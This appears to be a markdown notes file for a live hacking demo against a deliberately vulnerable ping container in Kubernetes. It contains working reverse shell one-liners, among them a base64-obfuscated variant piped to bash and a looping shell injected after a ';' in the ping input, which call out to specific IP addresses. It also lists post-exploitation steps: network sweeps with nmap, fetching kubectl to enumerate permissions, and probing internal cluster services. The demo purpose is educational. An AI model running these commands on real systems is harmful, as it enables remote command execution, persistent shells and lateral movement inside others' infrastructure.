# docker
```bash
docker build -t biltisberger/vuln-ping:latest .
docker push biltisberger/vuln-ping:latest
docker run -d --name vuln-ping -p 8080:8080 biltisberger/vuln-ping:latest
```

# Listen for incoming connections
```bash
sudo nc -nvl 1338
```

# Connect to the listener
```bash
echo "bash -c 'bash -i >& /dev/tcp/192.168.178.113/1338 0>&1'" | base64
echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3OC4xMTMvMTMzOCAwPiYxJwo= | base64 -d | bash 2>/dev/null

// even better with a loop if the connection dies
google.com;while true; do sh -i >& /dev/tcp/88.198.205.24/9001 0>&1; sleep 1; done
```

# Ok we are on the host
```bash
nmap -sn 10.1.11.0/24 | grep 'Nmap scan report for' | awk '{print $5, $6}'
nmap angular2.bene-default-oi9z17.svc.cluster.local

curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
./kubectl auth can-i --list

curl https://metrics-server.mogenius.svc.cluster.local:443/apis/metrics.k8s.io/v1beta1/pods --insecure

```

# Links
- [https://hub.docker.com/r/biltisberger/vuln-ping](https://hub.docker.com/r/biltisberger/vuln-ping)
- [https://github.com/mogenius/meetup-2024-hack](https://github.com/mogenius/meetup-2024-hack)

# Sources
- [https://www.revshells.com/](https://www.revshells.com/)
- [https://www.youtube.com/watch?v=iD_klswHJQs&t=1209s&ab_channel=JohnHammond](https://www.youtube.com/watch?v=iD_klswHJQs&t=1209s&ab_channel=JohnHammond)
- [https://www.youtube.com/watch?v=c7hLUsUE_Ao&t=183s&ab_channel=DanielLowrie](https://www.youtube.com/watch?v=c7hLUsUE_Ao&t=183s&ab_channel=DanielLowrie)


"services.K8sUpdateDeploymentRequest.Data: readObjectStart: expect { or n, but found \", error found in #9 byte of ...|{\"data\":\"kind: Depl|..., bigger context ...|{\"data\":\"kind: Deployment\\napiVersion: apps/v1\\nmetadata:\\n|..."


# Developer RBAC-User 
- login as the user create a deployment
